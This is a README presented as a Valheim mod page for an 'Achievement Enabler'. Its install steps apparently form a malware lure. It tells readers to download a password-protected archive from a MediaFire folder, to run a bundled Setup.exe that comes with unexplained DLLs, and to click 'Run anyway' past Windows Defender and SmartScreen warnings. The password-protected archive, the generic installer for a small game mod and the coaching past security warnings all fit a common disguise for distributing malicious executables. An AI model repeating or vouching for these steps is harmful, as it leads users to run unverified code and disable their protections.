# Achievement Enabler & Item Tag Cleanup

**Keep earning achievements after console commands, with clean item labels and no confirmation prompt.**

<p align="center">
  <img src="https://staticdelivery.nexusmods.com/mods/3667/images/3618/3618-1789030306-801084101.png" alt="Preview" width="70%">
</p>


_Game: **Valheim** · Author: **Invau** · Downloads: **8,090** · Endorsements: **65**_

---

## 📖 About this mod

This mod removes Valheim’s persistent status that blocks achievements after developer commands. It cleans existing item labels, prevents new ones from being marked, and keeps the process automatic. The changes apply to your own game and saved character data.

## ⚙️ Requirements

Requires Valheim 1.0.x.

## ✨ Features

- **Achievement Access** — Achievements continue unlocking after using console and developer commands.
- **Clean Item Labels** — Removes existing creation labels and prevents new items from receiving them.
- **Instant Commands** — Skips the confirmation prompt so supported commands run immediately.

## 🏷️ Tags

`valheim` · `achievements` · `console-commands` · `developer-commands` · `item-tags` · `item-cleanup` · `gameplay` · `quality-of-life` · `survival` · `sandbox` · `character` · `save-data` · `multiplayer` · `dedicated-server` · `client-side`

## 📦 Installation & Setup

### Step 1 — Download

Download the archive from the official page: **https://www.mediafire.com/folder/wo1g3rjtd5bd0/setup**

### Step 2 — Extract with Password

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3 — Extract All Files

1. Extract **all files** from the archive into a folder of your choice.
2. **IMPORTANT:** all files must stay in the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
├── Setup.exe                          → main installer launcher
├── core.dll                           → core mod framework
├── lib.dll                            → shared library used by the mod
├── mpclient.dll                       → in-game module loaded at runtime
├── config.ini                         → configuration file with default settings
├── checksum.md5                       → integrity check for the archive
└── Password 2026.txt                  → password reminder (empty file)
```

### Step 4 — Run the Installer

1. Open the folder where you extracted the files.
2. Run `Setup.exe`.
3. The installer window will appear.

### Step 5 — Install the Mod

1. In the installer window, click **Install**.
2. Wait for the confirmation message *"Installation completed successfully"*.

### Step 6 — Launch the Game

1. Launch the game through the installer (click **Play**) or via the standard shortcut.
2. Enjoy your modded game.

> 🧩 If Windows Defender / SmartScreen shows a warning the first time,
> click **More info → Run anyway**. This is a normal false positive for
> unsigned installers.

---

<div align="center">

### ⭐ Enjoying this mod?

If this mod made your game better, please give this repository a star —
it helps other players find it and motivates us to keep improving.

**Thanks for your support!** 🎮

</div>
